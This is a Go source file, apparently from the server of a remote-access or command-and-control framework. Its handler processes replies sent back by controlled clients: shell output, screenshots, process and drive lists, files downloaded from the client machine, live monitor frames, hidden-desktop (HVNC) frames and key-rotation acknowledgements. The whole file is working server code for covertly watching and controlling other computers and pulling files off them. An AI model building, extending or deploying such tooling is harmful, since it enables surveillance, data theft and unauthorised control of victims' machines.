package command

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"strings"
)

// HandleClientReply 处理客户端回包（replyType(4)|data），供 TCP/KCP/WebSocket 三协议共用。
// 原实现三份近 400 行重复 switch 各自维护，易产生漂移（如 shell 追加写法、日志级别不一致）；
// 合并于此，数据日志统一 Debugf（默认 Info 级不输出，避免每消息刷屏）。
// xtermBroadcast / hvncBroadcast 为会话广播回调（由 api 包注入，nil 时跳过）。
func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
	xtermBroadcast func(uid string, data []byte),
	hvncBroadcast func(uid, sid string, frame []byte)) error {

	switch replyType {
	case 0: // 命令行输出或截图数据
		// 智能判断：结合命令上下文和数据格式检查
		isExpectedScreenshot := VarScreenshotQueue.IsScreenshotExpected(uid)
		isImageFormat := IsImageData(data)

		logx.Debugf("[%s] 数据分析 - UID: %s, 数据长度: %d, 期望截图: %t, 图像格式: %t\n",
			listenerType, uid, len(data), isExpectedScreenshot, isImageFormat)

		// 只有同时满足以下条件才认为是截图数据：
		// 1. 服务端最近发送了截图命令
		// 2. 数据格式符合图像特征（二进制魔数，或 base64 文本形态的 data URI 前缀——
		//    部分客户端回传 "data:image/..." 文本，无二进制魔数，B4 收敛前 HTTP 走宽松判定）
		// 3. 数据大小合理（避免过小的误判）
		isDataURI := len(data) > 22 && strings.HasPrefix(string(data), "data:image/")
		if isExpectedScreenshot && (isImageFormat || isDataURI) && len(data) > 1024 {
			// 处理截图数据
			var screenshotDataURI string
			if strings.HasPrefix(string(data), "data:image/") {
				// 数据已经是完整的Data URI格式
				screenshotDataURI = string(data)
			} else {
				// 原始二进制数据，需要转换为base64
				screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
			}
			VarScreenshotQueue.Add(uid, screenshotDataURI)
			// 清除截图期望状态
			VarScreenshotQueue.SetScreenshotExpected(uid, false)
		} else {
			// 当作普通命令行输出处理
			if !isExpectedScreenshot && len(data) > 100000 {
				logx.Debugf("[%s] 大数据包但非截图上下文 - UID: %s, 长度: %d, 可能是其他大文件传输\n", listenerType, uid, len(data))
			}

			// 转换编码以解决中文乱码问题
			utf8Data, encodeErr := utils.ProcessShellOutput(data)
			if encodeErr != nil {
				utf8Data = data
			}
			// 【优化】SQL 增量追加，免去"读整 blob → 追加 → 写回"的 IO 放大
			database.AppendShellContent(uid, string(utf8Data)+"\n")
		}
	case PS:
		// 转换编码以解决中文乱码问题
		utf8Data, encodeErr := utils.ProcessShellOutput(data)
		if encodeErr != nil {
			utf8Data = data
		}
		VarPidQueue.Add(uid, string(utf8Data))
	case FileBrowse:
		// 转换编码以解决中文乱码问题
		utf8Data, encodeErr := utils.ProcessShellOutput(data)
		if encodeErr != nil {
			utf8Data = data
		}
		VarFileBrowserQueue.Add(uid, string(utf8Data))
	case 22: // 文件下载第一条信息（v2：fileLen(8)|requestId(4)|path）
		// 检查数据长度是否足够
		if len(data) < 12 {
			return fmt.Errorf("文件下载信息数据长度不足")
		}
		fileLen := int64(binary.BigEndian.Uint64(data[:8]))
		downloadReqID := binary.BigEndian.Uint32(data[8:12])
		filePath := string(data[12:])
		sql := `UPDATE downloads SET file_size = ?, downloaded_size = ? WHERE uid = ? AND file_path = ?;`
		database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
		// v2：按 requestId 管理文件句柄（并发下载互不污染 + 断点续传）
		if err := VarDownloadFiles.Start(uid, downloadReqID, filePath); err != nil {
			logx.Errorf("❌ 下载文件打开失败 - UID: %s, 路径: %s, 错误: %v", uid, filePath, err)
		}
	case DOWNLOAD: // 文件下载分块（v2：requestId(4)|chunk）
		// 检查数据长度是否足够
		if len(data) < 4 {
			return fmt.Errorf("文件下载数据长度不足")
		}
		downloadReqID := binary.BigEndian.Uint32(data[:4])
		fileContent := data[4:]
		// 按 requestId 追加写入（写错误检查，不再静默丢数据）
		if ok, err := VarDownloadFiles.Append(uid, downloadReqID, fileContent); err != nil {
			return err
		} else if ok {
			// 【优化】下载进度节流落库：内存累加 + 周期批量刷盘，避免每分块一次 DB 写事务
			database.QueueDownloadProgress(uid, int64(len(fileContent)))
		}
	case DRIVES:
		// 对驱动器列表进行编码处理
		utf8Data, encodeErr := utils.ProcessShellOutput(data)
		if encodeErr != nil {
			utf8Data = data
		}
		drives := utils.GetExistingDrives(utf8Data)
		VarDrivesQueue.Add(uid, drives)
	case SCREENSHOT1:
		// 屏幕截图 - 正确处理二进制图像数据
		var screenshotDataURI string
		if len(data) > 22 && strings.HasPrefix(string(data), "data:image/") {
			screenshotDataURI = string(data)
		} else {
			screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
		}
		VarScreenshotQueue.Add(uid, screenshotDataURI)
	case MONITOR_FRAME:
		// 监控帧数据 - 正确处理二进制图像数据
		var monitorDataURI string
		if len(data) > 22 && strings.HasPrefix(string(data), "data:image/") {
			monitorDataURI = string(data)
		} else {
			monitorDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
		}
		VarMonitorFrameQueue.Add(uid, []byte(monitorDataURI))
	case HVNC_FRAME:
		// HVNC 隐藏桌面帧 - [4B sidLen][sid][JPEG]
		sid, jpeg, ok := ParseHVNCFrame(data)
		if !ok {
			return nil
		}
		VarHVNCFrameQueue.Add(uid, sid, jpeg)
		if hvncBroadcast != nil {
			hvncBroadcast(uid, sid, jpeg)
		}
	case FILE_EDIT_READ:
		HandleFileEditRead(uid, data)
	case FILE_EDIT_WRITE:
		HandleFileEditWrite(uid, data)
	case UPLOAD_ACK:
		HandleUploadAck(uid, data)
	case FILE_OP_RESULT:
		HandleFileOpResult(uid, data)
	case INTERACTIVE_SHELL_START:
		// 交互式终端启动确认
		logx.Infof("✅[XTerm-%s] 客户端确认交互式终端启动: %s", listenerType, uid)
	case INTERACTIVE_SHELL_STOP:
		// 交互式终端停止确认
		logx.Infof("🛑 [XTerm-%s] 客户端确认交互式终端停止: %s", listenerType, uid)
	case INTERACTIVE_SHELL_INPUT:
		// 交互式终端输出数据 - 路由到XTerm会话（终端输出高频，不记日志）
		if xtermBroadcast != nil {
			xtermBroadcast(uid, data)
		}
	case 31:
		// 客户端命令错误回包（ErrorProcess）——广播到 XTerm 会话，前端可见提示
		// （如 Windows ConPTY 功能暂禁用时用户能看到具体原因）
		if xtermBroadcast != nil {
			xtermBroadcast(uid, data)
		}
	case encrypt.KeyRotateAckReplyType:
		// P3-1: 客户端确认密钥轮换（回包已用新密钥加密，服务端经 NextKey 解密成功即证明客户端持有新密钥）
		if encrypt.GlobalKeyManager != nil {
			if err := encrypt.GlobalKeyManager.ConfirmKeyRotation(uid); err != nil {
				logx.Warnf("⚠️ [KEY-ROTATE] 确认轮换失败 - UID: %s, 错误: %v", uid, err)
			}
		}
	default:
		logx.Warnf("⚠️ [%s] 未知的回包类型: %d, UID: %s", listenerType, replyType, uid)
	}
	return nil
}
